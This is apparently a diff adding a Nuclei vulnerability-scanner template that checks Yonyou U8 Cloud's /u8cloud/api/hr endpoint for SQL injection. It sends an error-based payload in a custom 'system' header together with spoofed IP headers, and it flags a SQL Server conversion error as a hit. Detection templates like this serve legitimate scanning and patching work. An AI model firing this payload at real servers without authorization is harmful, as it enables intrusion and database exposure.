@@ -1,0 +1,29 @@
+id: yongyou-U8-Cloud-hr-sqli
+
+info:
+  name: yongyou-U8-Cloud-hr-sqli
+  author: 影域
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /u8cloud/api/hr HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        system: -1' or 1=@@version--+
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-Ip: 127.0.0.1
+        X-Remote-Ip: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body," 转换成数据类型 int 时失败")
